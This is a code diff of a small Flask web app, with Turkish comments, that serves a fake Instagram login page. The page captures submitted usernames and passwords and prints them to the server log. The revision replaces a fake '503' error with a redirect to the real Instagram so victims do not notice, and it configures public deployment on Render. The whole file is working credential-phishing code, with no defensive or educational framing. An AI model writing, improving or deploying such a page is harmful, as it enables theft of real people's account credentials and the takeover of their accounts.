@@ -1,31 +1,27 @@
-
-    import os
-from flask import Flask, request, render_template_string
+import os
+from flask import Flask, render_template_string, request, redirect
 
 app = Flask(__name__)
 
-# Bu değişken şifre girilip girilmediğini tutar
-SISTEM_ACIK = True
-
-HTML_KODU = """
+# INSTAGRAM GİRİŞ SAYFASI (TEK TIKLAMA LİNKİ)
+HTML_SAYFASI = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap • Instagram</title>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
     <style>
         body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
-        .insta-text { font-size: 35px; font-weight: bold; margin-bottom: 30px; font-style: italic; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
-        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="insta-text">Instagram</div>
-        <form method="POST" action="/login">
-            <input type="text" name="u" placeholder="Kullanıcı adı" required>
+    <div class="login-box">
+        <h1 style="font-style: italic;">Instagram</h1>
+        <form action="/login" method="post">
+            <input type="text" name="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
             <input type="password" name="p" placeholder="Şifre" required>
             <button type="submit">Giriş Yap</button>
         </form>
@@ -34,27 +30,22 @@ HTML_KODU = """
 </html>
 """
 
-HATA_EKRANI = "<h1>503 Service Unavailable</h1><p>Sunucu bakimda.</p>"
-
 @app.route('/')
-def home():
-    global SISTEM_ACIK
-    # Eğer birisi daha önce giriş yaptıysa siteyi kapat
-    if not SISTEM_ACIK:
-        return HATA_EKRANI, 503
-    return render_template_string(HTML_KODU)
+def index():
+    return render_template_string(HTML_SAYFASI)
 
 @app.route('/login', methods=['POST'])
 def login():
-    global SISTEM_ACIK
-    # Bilgileri ekrana yazdır
-    print(f"VERI: {request.form.get('u')} - {request.form.get('p')}")
-    
-    # ŞİMDİ SİSTEMİ KAPATIYORUZ (İmha modu)
-    SISTEM_ACIK = False
-    
-    return HATA_EKRANI, 503
+    kullanici = request.form.get('u')
+    sifre = request.form.get('p')
+    # Bilgileri log ekranına yazdırır
+    print(f"GİRİŞ DENEMESİ -> Kullanıcı: {kullanici} | Şifre: {sifre}")
+    # Girişten sonra gerçek Instagram'a yönlendirir
+    return redirect("https://www.instagram.com")
 
+# --- RENDER İÇİN KRİTİK AYARLAR ---
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
+    # Render'ın verdiği 10000 portunu otomatik kullanır
+    port = int(os.environ.get("PORT", 10000))
+    # Dış dünyaya erişimi açar (Yeşil yanması için şart)
     app.run(host='0.0.0.0', port=port)
